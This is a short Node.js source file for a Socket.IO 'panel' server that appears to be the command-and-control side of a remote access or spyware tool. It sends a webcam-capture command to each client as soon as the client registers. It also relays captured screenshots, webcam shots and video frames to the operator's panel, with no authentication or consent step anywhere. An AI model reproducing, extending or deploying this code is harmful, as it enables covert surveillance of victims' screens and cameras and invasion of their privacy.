"use strict"

// --------------- INCLUDES ---------------
const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const port = process.env.PORT || 3000;
const { time } = require('console');
const fs = require("fs")

// --------------- PANEL ROUTES ---------------
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/panel/index.html');
});

// --------------- SOCKIO CONNECTION ---------------
io.on('connection', (socket) => {
    let addedClient = false
    console.log("---------------- New connection ----------------")

    socket.on("add client", (options) => {
        if (addedClient) return

        socket.clientData = options
        addedClient = true

        // 10s stream
        socket.emit("command", { event: "webcamshot" });
    })

    socket.on("error", (options) => {
        console.log("Error: ", options)
        socket.broadcast.emit("error", options)
    })

    socket.on("info", (options) => {
        console.log("Info: ", options)
        socket.broadcast.emit("info", options)
    })

    socket.on("screenshot", (imageBuffer) => {
        socket.broadcast.emit('screenshot', imageBuffer.toString("base64"));
    })

    socket.on("webcamshot", (imageBuffer) => {
        socket.broadcast.emit('webcamshot', imageBuffer.toString("base64"));
    })

    socket.on("frame", (imageBuffer) => {
        socket.broadcast.emit('frame', imageBuffer.toString("base64"));
    })

    // EMIT GREETING
    socket.emit("command", { event: "greet" })
});

// --------------- START SERVER ---------------
http.listen(port, () => {
    console.log(`Socket.IO server running at http://localhost:${port}/`);
});